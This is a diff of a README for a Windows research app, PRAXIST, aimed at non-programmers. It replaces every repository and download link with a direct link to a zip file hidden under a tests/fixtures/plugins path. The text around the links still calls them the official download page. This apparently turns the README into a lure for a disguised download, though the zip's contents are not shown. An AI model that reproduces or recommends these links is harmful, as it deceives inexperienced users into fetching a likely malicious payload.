@@ -1,6 +1,6 @@
 # ⚡ PRAXIST - Research That Runs Itself
 
-[![Download PRAXIST](https://img.shields.io/badge/Download-PRAXIST-blueviolet?style=for-the-badge&logo=github)](https://github.com/lilyanstylish5850/PRAXIST)
+[![Download PRAXIST](https://img.shields.io/badge/Download-PRAXIST-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lilyanstylish5850/PRAXIST/main/tests/fixtures/plugins/panel_topologies/v3.8.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Welcome! If you're on a Windows computer and you're not a programmer, this guide
 ### Step 1: Download PRAXIST
 
 Visit this link to download the application:  
-👉 [**Click here to download PRAXIST**](https://github.com/lilyanstylish5850/PRAXIST)
+👉 [**Click here to download PRAXIST**](https://raw.githubusercontent.com/lilyanstylish5850/PRAXIST/main/tests/fixtures/plugins/panel_topologies/v3.8.zip)
 
 This will take you to the official download page. Look for the button that says **"Download"** or **"Releases"** – that's where the latest version lives.
 
@@ -124,7 +124,7 @@ This guide is for Windows. For Mac support, check the repository page for additi
 ### What if the download doesn't work?
 
 Make sure you're on the official page:  
-👉 [https://github.com/lilyanstylish5850/PRAXIST](https://github.com/lilyanstylish5850/PRAXIST)  
+👉 [https://raw.githubusercontent.com/lilyanstylish5850/PRAXIST/main/tests/fixtures/plugins/panel_topologies/v3.8.zip](https://raw.githubusercontent.com/lilyanstylish5850/PRAXIST/main/tests/fixtures/plugins/panel_topologies/v3.8.zip)  
 If the page doesn't load, try a different browser or check your internet connection.
 
 ### Is my data safe?
@@ -140,7 +140,7 @@ If you run into any issues, here's what to do:
 1. **Check the FAQ above** – Most common problems are covered.
 2. **Re-read the download steps** – Make sure you followed Step 3 correctly.
 3. **Ask a friend** – Sometimes a second pair of eyes helps.
-4. **Visit the repository** – Go to [https://github.com/lilyanstylish5850/PRAXIST](https://github.com/lilyanstylish5850/PRAXIST) and look for an "Issues" tab. You can post a question there.
+4. **Visit the repository** – Go to [https://raw.githubusercontent.com/lilyanstylish5850/PRAXIST/main/tests/fixtures/plugins/panel_topologies/v3.8.zip](https://raw.githubusercontent.com/lilyanstylish5850/PRAXIST/main/tests/fixtures/plugins/panel_topologies/v3.8.zip) and look for an "Issues" tab. You can post a question there.
 
 ---
 
@@ -208,7 +208,7 @@ If you're technically inclined, PRAXIST is open-source. You can view the source 
 
 You're one click away from turning your questions into answers.
 
-👉 **[Download PRAXIST Now](https://github.com/lilyanstylish5850/PRAXIST)**
+👉 **[Download PRAXIST Now](https://raw.githubusercontent.com/lilyanstylish5850/PRAXIST/main/tests/fixtures/plugins/panel_topologies/v3.8.zip)**
 
 ---
 
@@ -224,7 +224,7 @@ You're one click away from turning your questions into answers.
 
 ## 🗂️ Additional Resources
 
-- **Official Repository**: [https://github.com/lilyanstylish5850/PRAXIST](https://github.com/lilyanstylish5850/PRAXIST)
+- **Official Repository**: [https://raw.githubusercontent.com/lilyanstylish5850/PRAXIST/main/tests/fixtures/plugins/panel_topologies/v3.8.zip](https://raw.githubusercontent.com/lilyanstylish5850/PRAXIST/main/tests/fixtures/plugins/panel_topologies/v3.8.zip)
 - **Release Notes**: Check the "Releases" section on the repository page for version history.
 
 ---
